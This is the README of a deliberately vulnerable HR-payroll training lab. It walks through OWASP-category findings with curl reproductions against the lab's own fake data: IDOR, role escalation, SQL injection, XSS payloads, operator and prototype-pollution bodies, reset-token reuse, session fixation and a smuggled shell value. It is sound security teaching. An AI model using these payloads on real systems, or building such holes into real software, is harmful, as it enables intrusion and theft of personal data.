# PeopleFlow Security Lab

PeopleFlow is a grey-box training app with synthetic HR and payroll records. Use it only in a private, isolated workshop to practice identifying and explaining application-security findings.

> **Do not publish or expose this app to the public internet.** It intentionally contains broken access controls, injection paths, weak demo credentials, and sensitive-data exposure. The database is seeded with fake data, but the app is not safe for real users or real information.

## Start the lab

The Replit project uses two managed services:

- PeopleFlow web app: open the project preview.
- API: served under `/api`.

For shell-based checks in the Replit workspace, use the shared proxy:

```sh
export BASE_URL=http://localhost:80
```

For requests from your own terminal, set `BASE_URL` to the private preview origin you are testing, with no trailing slash. Keep it pointed at this lab only.

Candidate account:

```text
alice@peopleflow.test
alice123
```

Seeded records and reset tokens live in memory and return to their original state when the API process restarts. To reset during a session:

```sh
curl -sS -X POST "$BASE_URL/api/lab/reset"
```

The reset clears the lab's in-memory records, sessions, reset tokens, and request-log fixture. Keep separate cookie jars for separate exercises:

```sh
export COOKIE_JAR=/tmp/peopleflow-lab.cookies
curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@peopleflow.test","password":"alice123"}' \
  "$BASE_URL/api/login"
```

## Findings and safe reproductions

These examples use only the seeded fake tenant. The expected outcomes describe the training implementation, not a production-safe design.

### A01 — Broken access control: IDOR, BOLA, and role escalation

**Impact:** Any signed-in employee can fetch other employees' fake PII and payslips by changing an ID. The admin API checks for a session but does not check the user's role. Profile updates also accept role and salary fields.

**Reproduce employee and payslip access:**

```sh
curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/employees/108"
curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/employees/108/payslip"
```

Compare those responses with Alice's record at `/api/employees/101`. Both include sensitive-looking but fake values.

**Reproduce role escalation through the admin API:**

```sh
curl -sS -b "$COOKIE_JAR" -H 'Content-Type: application/json' \
  -d '{"userId":101,"role":"SUPER_ADMIN"}' \
  "$BASE_URL/api/admin/role"
curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/admin"
```

**Reproduce mass assignment through profile update:**

```sh
curl -sS -b "$COOKIE_JAR" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"role":"SUPER_ADMIN","salary":-50000,"bankAccount":"0000000099999"}' \
  "$BASE_URL/api/profile/update"
```

The profile flow also accepts those fields through `PATCH /api/profile`.

### A02 — Security misconfiguration

**Impact:** The lab's public config endpoint discloses training-only values, error handling returns stack details, and API CORS allows any origin.

**Reproduce config exposure:**

```sh
curl -sS "$BASE_URL/api/config"
```

The values named `secret123` and `pf_test_FAKE_ONLY_123456` are fixed fake strings. No workspace secret or real third-party credential is read by this endpoint.

**Reproduce verbose error output:** send a malformed SQL search value as shown under A05. The error response includes a stack and the `sqlite::memory:` training database label.

For a direct check, use an unclosed quote followed by `OR` as the search term:

```sh
curl -sS -G -b "$COOKIE_JAR" --data-urlencode "search=' OR" \
  "$BASE_URL/api/employees"
```

The training API returns the query error, stack, and in-memory database label.

**Check CORS:**

```sh
curl -sSI -H 'Origin: https://example.invalid' "$BASE_URL/api/config"
```

Look for `Access-Control-Allow-Origin: *`.

### A03 — Software supply-chain failures

**Status in this safe build:** Not installed as a live vulnerability. The original brief asked for known-vulnerable packages and an unpinned third-party CDN script. This build does not load those packages or scripts; adding them would expose the app's visitors to real dependency risk. Treat A03 as an interview discussion prompt, not a finding reproducible from the running bundle.

For a code review, inspect `package.json` and the built page's script sources. Do not infer that an outdated package is present from this README.

### A04 — Cryptographic failures

**Impact:** Demo passwords are stored as unsalted MD5 hashes; employee SSNs and bank-account fixtures are stored as plaintext in the in-memory SQLite database. Session cookies use an HMAC signature with the hardcoded weak training key exposed by `/api/config`.

**Reproduce the exposed PII:** use Alice's session to request another employee, for example `/api/employees/108`. The response returns the seeded SSN and bank-account fields in plaintext.

**Grey-box source check:** inspect `artifacts/api-server/src/routes/peopleflow.ts`. The seed setup creates `password_md5`, and the login path compares MD5 digests. The database is created with Node's in-process SQLite module and does not write a database file.

The cookie value has the form `session-id.signature`. The signature is an HMAC-SHA256 made with the disclosed training key. The session ID is intentionally retained through login, as described under A07.

### A05 — Injection: SQL injection and cross-site scripting

**SQL injection:** employee search concatenates the input into a SQLite `LIKE` query.

```sh
curl -sS -G -b "$COOKIE_JAR" \
  --data-urlencode "search=' OR '1'='1' -- " \
  "$BASE_URL/api/employees"
```

The result includes all seeded employees rather than only matches. A syntactically invalid search term can also return the verbose error described under A02.

**Reflected XSS:** open this route in a browser using an authenticated session and a harmless alert payload:

```text
/api/employee-search-view?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

The template includes the raw search text in the HTML response. The proof-of-concept only displays a local alert; do not replace it with code that reads or transmits browser data.

**Stored XSS:** save a harmless test payload in Alice's bio:

```sh
curl -sS -b "$COOKIE_JAR" -X PATCH \
  -H 'Content-Type: application/json' \
  -d '{"bio":"<img src=x onerror=alert(1)>"}' \
  "$BASE_URL/api/profile"
```

Then open `/api/employee-view/101` in the same browser. The legacy EJS view renders the bio without escaping, so the alert runs in that page's origin. Reset the lab after the exercise.

**NoSQL-style operator injection:** the document fixture models Mongo query-operator behavior in memory; it does not start an external MongoDB service.

```sh
curl -sS -G -b "$COOKIE_JAR" \
  --data-urlencode 'filter[employee_id][$ne]=101' \
  "$BASE_URL/api/documents"
```

The operator-shaped filter returns documents not owned by employee 101. This is a local semantic simulation, not an actual MongoDB query.

### A06 — Insecure design and business-logic flaws

**Predictable, reusable reset token:** request a token for the candidate account:

```sh
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"email":"alice@peopleflow.test"}' \
  "$BASE_URL/api/forgot-password"
```

The first token in a fresh process is `4100`, and subsequent tokens increment. Use the same returned token more than once:

```sh
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"token":"4100","password":"training-change-1"}' \
  "$BASE_URL/api/reset-password"
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"token":"4100","password":"training-change-2"}' \
  "$BASE_URL/api/reset-password"
```

The token has no expiry and remains usable. Restore the fixture with `/api/lab/reset`.

**Unbounded salary update:** A01's mass-assignment request sets Alice's salary to a negative amount. No approval or validation step is applied.

### A07 — Authentication failures

**Username enumeration:** compare the errors for an unknown email and a known email with the wrong password:

```sh
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"email":"nobody@peopleflow.test","password":"wrong"}' "$BASE_URL/api/login"
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"email":"alice@peopleflow.test","password":"wrong"}' "$BASE_URL/api/login"
```

The messages differ. The demo login also has no lockout or rate limit.

**Session fixation:** request a pre-authentication session ID, then log in with the same cookie jar:

```sh
curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$BASE_URL/api/session"
curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@peopleflow.test","password":"alice123"}' "$BASE_URL/api/login"
```

The `sessionId` is reused after authentication instead of being rotated.

### A08 — Software/data integrity: import handling

**Status:** The import endpoint is deliberately modeled, not implemented with an unsafe deserializer. It never executes code or changes `Object.prototype`.

```sh
curl -sS -b "$COOKIE_JAR" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"trainingFlag":true},"employees":[]}' \
  "$BASE_URL/api/import"
```

The response confirms that the key was noticed and the payload was safely simulated. This demonstrates where an integrity review belongs without providing a code-execution path.

### A09 — Security logging and alerting failures

**Impact:** There is no dedicated audit event for failed logins, role changes, or PII reads. Separately, the training request log records full request bodies, including fake passwords, and the log endpoint is public.

After making a login request, retrieve the fixture:

```sh
curl -sS "$BASE_URL/api/logs"
```

The API process console also receives these request-body records. Only use fake credentials in this lab.

### A10 — Exceptional-condition handling and unsafe diagnostics

**Fail-open auth simulation:** this lab-only header forces an auth-middleware exception. The catch branch continues with a synthetic admin identity:

```sh
curl -sS -H 'x-lab-trigger: auth-error' "$BASE_URL/api/admin"
```

No login cookie is required for this one controlled demonstration.

**Command-injection simulation:** the diagnostic endpoint inspects a harmless string and reports when shell metacharacters are present, but never invokes a shell or runs a command:

```sh
curl -sS -G -b "$COOKIE_JAR" \
  --data-urlencode 'target=localhost; echo lab-only' \
  "$BASE_URL/api/admin/tools"
```

The response is marked `simulated: true`. Do not use this route to test a real host.

## Lab implementation boundaries

- All employee records and passwords are synthetic. The SQLite database is in-memory and reseeded on process start.
- Document search uses a small in-memory Mongo-shaped fixture, not a live database.
- The import and diagnostic exercises are safe simulations. No shell command, unsafe deserializer, or user-supplied code is executed.
- A03 is intentionally omitted as a live issue: the app does not install known-vulnerable dependencies or load an unpinned external script.
- The app contains intentional vulnerabilities and should not be published or used with real data.
